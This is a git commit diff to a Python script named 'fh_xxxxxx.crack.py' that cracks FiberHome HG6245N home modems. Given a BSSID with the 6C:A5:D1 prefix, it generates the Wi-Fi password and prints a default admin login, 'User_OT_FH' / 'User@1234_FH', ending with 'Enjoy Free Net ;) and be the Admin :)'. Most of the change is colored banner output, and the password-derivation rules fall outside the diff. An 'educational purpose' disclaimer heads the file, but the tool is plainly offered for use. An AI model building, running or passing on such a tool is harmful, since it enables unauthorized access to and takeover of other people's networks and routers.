92a593b2bacaca014e78ca853796e4365c49eaf8
Yosef <63985418+y053f01@users.noreply.github.com>
2024-03-10 12:19:29 -0400

    Clarify the code and improvement.

--- fh_xxxxxx.crack.py
+++ fh_xxxxxx.crack.py
@@ -1,6 +1,17 @@
 # This code is for educational purpose!!!
-# I am not resposible, use it at your own
+# I am not resposible, use it at your own risk!!!
 # (c) All rights reserved to @y053f01
+
+class colors:
+
+ CGREY    = '\33[90m'
+ CRED2    = '\33[91m'
+ CGREEN2  = '\33[92m'
+ CYELLOW2 = '\33[93m'
+ CBLUE2   = '\33[94m'
+ CVIOLET2 = '\33[95m'
+ CBEIGE2  = '\33[96m'
+ CWHITE2  = '\33[97m'
 
 def generate_password(mac_address):
     # Transformation rules
@@ -37,23 +48,23 @@ def main():
     # Prompt the user to enter the MAC address
     print(f"""
 
-   This code is for educational purpose!!!
-   I am not resposible, use it at your own risk!!!
+  {colors.CGREEN2} ###############   {colors.CWHITE2}fh_xxxxxx Crack  {colors.CGREEN2} ###############
+                                                                                                 
+         {colors.CYELLOW2}Developer: {colors.CRED2}@y053f01{colors.CGREEN2}
+         {colors.CYELLOW2}Version: {colors.CBLUE2}1.2{colors.CGREEN2}
+         {colors.CYELLOW2}Target: {colors.CWHITE2}FiberHome Modem{colors.CGREEN2}
+         {colors.CYELLOW2}Modem version: {colors.CWHITE2}HG6245N{colors.CGREEN2}
+         {colors.CYELLOW2}MAC Address patern: {colors.CBLUE2}6C:A5:D1:XX:XX:XX{colors.CGREEN2}
+         {colors.CWHITE2}(c) All rights reserved{colors.CGREEN2}
+                                                                                 
+   ###################################################{colors.CWHITE2}
 
-
-   ###### fh_xxxxxx Crack #########
-   #     Developer: @y053f01      #
-   #     Version: 1.1             #
-   #     Target: FiberHome Modem  #
-   #     Modem version: HG6245N   #
-   #    (c) All rights reserved   #
-   ################################
 """)
-    mac_address = input("Enter the MAC address: ").upper()
+    mac_address = input("Enter the BSSID (MAC address) [6C:A5:D1:XX:XX:XX]: ").upper()
 
     # Check if the first three parts of the MAC address match a specific pattern
     if mac_address[:8] != '6C:A5:D1':
-        print("Can't generate the password, it not fh_xxxxxx FiberHome modem :(")
+        print(f"""\n{colors.CYELLOW2}Can't generate the password, it not fh_xxxxxx FiberHome modem :( """)
     else:
         # Generate the SSID
         ssid = 'fh_' + ''.join(mac_address.split(':')[3:]).upper()
@@ -62,13 +73,15 @@ def main():
         password = generate_password(mac_address)
 
         # Print the MAC address, SSID, and password in lowercase
-        print("MAC Address:", mac_address.lower())
-        print("SSID:", ssid.lower())
-        print("Password:", password.lower())
-        print("Admin Web: http://192.168.1.1")
-        print("Admin Username: User_OT_FH")
-        print("Admin Password: User@1234_FH")
-        print("\n Enjoy Free Net ;) and be the Admin :)")
+        print(f"""
+{colors.CWHITE2}BSSID (MAC Address) is:  6C:A5:D1:XX:XX:XX
+SSID: {ssid.lower()}
+PSK (Password): {colors.CGREEN2}{password.lower()}{colors.CWHITE2}
+Admin Web: http://192.168.1.1
+Admin Username: User_OT_FH"
+Admin Password: User@1234_FH
+Enjoy Free Net ;) and be the Admin :)
+""")
 
 if __name__ == "__main__":
     main()
